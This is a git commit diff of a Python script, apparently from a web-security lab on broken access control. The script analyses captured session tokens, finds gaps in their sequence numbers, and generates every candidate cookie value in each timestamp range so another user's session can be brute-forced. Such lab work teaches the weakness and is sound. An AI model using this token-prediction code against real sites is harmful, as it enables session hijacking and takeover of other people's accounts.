4b622be03de1dd10b44f106a0af41f484277bc9c
James-Lu-none <jamesabcde277@gmail.com>
2024-01-19 18:58:16 +0800

    add token gen logics

--- brokenAccessControl/hijackingSessionCookie/cookie_prediction.py
+++ brokenAccessControl/hijackingSessionCookie/cookie_prediction.py
@@ -1,7 +1,8 @@
 import os
-
+current_dir="./brokenAccessControl/hijackingSessionCookie/"
 tokens=[]
-file_path="brokenAccessControl/hijackingSessionCookie/tokens"
+token_file="./tokens"
+file_path=os.path.join(current_dir,token_file)
 with open(file_path, 'r', encoding='utf-8') as file:
     for line in file:
         line = line.strip()
@@ -18,10 +19,26 @@ for i in range(len(tokens)-1):
     # print(f"{s0} {s1}")
     if(s1-s0==2):
         # print(s0+1)
-        dif.append((str(s0+1) , str(t0%100), str(t1%100), str(t1-t0)))
+        dif.append((str(s0+1) , str(t0), str(t1), str(t1-t0)))
 
 dif = sorted(dif, key=lambda x: int(x[3]),reverse=True)
-f = open("brokenAccessControl/hijackingSessionCookie/bruteForceTokens", "w")
+
+possible_cookie_file="./possibleCookie"
+f = open(os.path.join(current_dir,possible_cookie_file), "w")
 for i in dif:
     f.write(" ".join(i)+'\n')
+f.close()
+
+cookie_gen=[]
+for i in dif:
+    s,t0,t1,dt=i
+    dt=int(dt)
+    t0=int(t0)
+    if(dt<10): continue
+    for j in range(dt+1):
+        cookie_gen.append(f"{s}-{t0+j}")
+gen_cookies_file="./gen_cookies"
+f = open(os.path.join(current_dir,gen_cookies_file), "w")
+for i in cookie_gen:
+    f.write("".join(i)+"\n")
 f.close()
